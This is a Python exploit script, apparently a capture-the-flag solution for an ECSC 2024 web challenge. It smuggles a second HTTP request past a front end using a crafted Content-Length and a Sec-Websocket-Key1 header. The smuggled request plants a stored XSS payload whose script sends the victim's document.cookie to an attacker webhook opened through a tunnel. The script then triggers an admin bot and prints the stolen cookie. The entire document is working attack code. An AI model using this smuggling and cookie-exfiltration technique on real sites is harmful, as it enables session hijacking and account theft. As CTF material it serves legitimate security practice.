#!/usr/bin/env python3

import logging
import os
import re
import socket
import uuid

import requests
import tunnel

logging.disable()

POW_BYPASS = 'redacted'

with tunnel.open_http_tunnel() as t:
    WEBHOOK_URL = f"http://{t.remote_host}:{t.remote_port}"
    CTF_HOST = os.environ.get("HOST", "smaug.challs.external.open.ecsc2024.it")
    CTF_PORT = int(os.environ.get("PORT", 38317))

    PROPOSAL_UUID = str(uuid.uuid4())

    FIRST_REQUEST = (
            "GET /api/v1/ HTTP/1.1\r\n" +
            "Host: localhost\r\n" +
            "Content-Length: {}\r\n" +
            "Sec-Websocket-Key1: x\r\n" +
            "\r\n" +
            "xxxxxxxx"
    )
    SECOND_REQUEST_BODY = f'{{"uuid": "{PROPOSAL_UUID}", "name": "xss</title></head><body><script>fetch(`{WEBHOOK_URL}?${{document.cookie}}`, {{\\"mode\\": \\"no-cors\\"}})</script></body><!--", "price": "40", "description": "a", "seller": "a"}}'
    SECOND_REQUEST = (
            "POST /proposals HTTP/1.1\r\n" +
            "Host: localhost\r\n" +
            "Content-Type: application/json\r\n" +
            f"Content-Length: {len(SECOND_REQUEST_BODY)}\r\n" +
            "\r\n" +
            SECOND_REQUEST_BODY +
            "\r\n\r\n"
    )

    content_length = 8 + len(SECOND_REQUEST)
    SMUGGLED_REQUEST = FIRST_REQUEST.format(content_length) + SECOND_REQUEST

    print(f"payload length: {content_length}\n{SMUGGLED_REQUEST.encode()}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setblocking(True)
    sock.connect((CTF_HOST, CTF_PORT))
    sock.send(SMUGGLED_REQUEST.encode())
    sock.recv(1024)
    sock.close()

    r = requests.get(f"http://{CTF_HOST}:{CTF_PORT}/api/v1/")
    assert r.status_code == 418

    r = requests.get(f"http://{CTF_HOST}:{CTF_PORT}/api/v1/pow")
    r.raise_for_status()
    pow = r.json()

    r = requests.post(f"http://{CTF_HOST}:{CTF_PORT}/api/v1/notify", json={
        "proposal_uuid": PROPOSAL_UUID,
        "pow_uuid": pow["uuid"],
        "pow_solution": POW_BYPASS,
    })
    r.raise_for_status()

    _, path, _, _ = t.wait_request()
    t.send_response(200, {}, b'')

    print(path)
